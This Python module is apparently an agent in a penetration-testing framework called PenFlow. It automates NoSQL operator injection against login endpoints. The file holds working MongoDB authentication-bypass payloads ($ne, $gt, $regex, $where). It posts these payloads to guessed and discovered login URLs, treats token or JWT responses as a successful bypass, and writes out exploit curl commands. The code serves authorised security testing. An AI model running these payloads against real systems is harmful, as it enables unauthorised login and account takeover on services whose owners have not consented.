"""
Pure NoSQL Injection Capability Agent for PenFlow.

Capabilities:
  - MongoDB Operator Injection ($gt, $ne, $regex, $where)
  - CouchDB / Redis NoSQL Operator Injection
  - Authentication Bypass via NoSQL JSON / Query Operators
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.nosql_injection")

NOSQL_PAYLOADS = [
    {"username": "admin", "password": {"$ne": None}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin", "password": {"$regex": "^a"}},
    {"$where": "this.username == 'admin'"}
]


class NoSQLInjectionAgent(BaseCapabilityAgent):
    """
    Capability Agent probing MongoDB, CouchDB, and Redis NoSQL query operator injections.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="NoSQLInjectionAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="nosql_injection", name="Pure NoSQL Injection", description="Detects MongoDB/CouchDB operator injections ($ne, $gt, $regex) leading to auth bypass", priority=self.priority, tags=["nosql", "mongodb", "injection"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")

        http_client = context.get_http_client()
        target_urls = self._collect_endpoints(context)

        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []
        best_target = target_urls[0] if target_urls else f"https://{context.asset}/api/v1/auth/login"

        nosql_error_keywords = ["mongodb", "mongoerror", "couchdb", "bson", "unhandledrejection", "expression failed", "cast to objectid failed"]

        for endpoint in target_urls[:6]:
            for payload in NOSQL_PAYLOADS:
                try:
                    # 1. Direct Operator Injection test
                    exch = await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="POST",
                        url=endpoint,
                        json_data=payload
                    )
                    resp = exch.response
                    if not resp:
                        continue

                    body_lower = (resp.body_text or resp.body_snippet or "").lower()
                    exch_dict = exch.to_dict()

                    # Verification: successful auth bypass or exposed MongoDB error
                    is_auth_bypassed = resp.status_code in (200, 201) and ("token" in body_lower or "jwt" in body_lower or "success" in body_lower)
                    is_mongo_error = any(kw in body_lower for kw in nosql_error_keywords)

                    if is_auth_bypassed or is_mongo_error:
                        curl_cmd = f"curl -X POST '{endpoint}' -H 'Content-Type: application/json' -d '{payload}'"
                        severity = "CRITICAL" if is_auth_bypassed else "HIGH"
                        reasoning = f"{severity} NoSQL Operator Injection Confirmed: Endpoint '{endpoint}' accepted query operator payload '{payload}'."

                        findings.append({
                            "vulnerability_type": "nosql_injection",
                            "target_url": endpoint,
                            "payload": payload,
                            "severity": severity,
                            "confidence": 0.95 if is_auth_bypassed else 0.88,
                            "is_vulnerable": True,
                            "exploit_curl": curl_cmd,
                            "reproduction_steps": self.poc_generator.generate_reproduction_steps("NoSQL Operator Injection", endpoint, curl_cmd),
                            "description": reasoning,
                            "_exchange_obj": exch_dict
                        })
                        evidence["nosql_auth_bypass"] = True
                        break
                except Exception as e:
                    logger.debug(f"NoSQL test failed on {endpoint}: {e}")

        is_vuln = len(findings) > 0
        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vuln,
            confidence_score=0.95 if is_vuln else 0.0,
            reasoning=findings[0]["description"] if findings else "NoSQL operator injection inputs safely validated and rejected.",
            target_url=best_target,
            findings=findings,
            evidence={
                "nosql_auth_bypass": evidence.get("nosql_auth_bypass"),
                "findings": findings,
                "evidence_exchanges": [f.get("_exchange_obj", {}) for f in findings if f.get("_exchange_obj")]
            }
        ).to_dict()

    def _collect_endpoints(self, context: CapabilityExecutionContext) -> List[str]:
        target = context.asset if hasattr(context, "asset") else "example.com"
        target_url = target if target.startswith("http") else f"https://{target}"
        endpoints = [f"{target_url}/api/v1/auth/login", f"{target_url}/api/login", f"{target_url}/login"]

        if hasattr(context, "observations") and context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    for ep in data.get("endpoints", []):
                        if isinstance(ep, dict) and ep.get("url"):
                            endpoints.append(ep["url"])

        if hasattr(context, "shared_cache") and context.shared_cache:
            mapped = context.shared_cache.get("endpoint_mapping", [])
            for ep in mapped:
                if isinstance(ep, str) and ep.startswith("http"):
                    endpoints.append(ep)
                elif isinstance(ep, dict) and "url" in ep:
                    endpoints.append(ep["url"])

        return list(dict.fromkeys(endpoints))

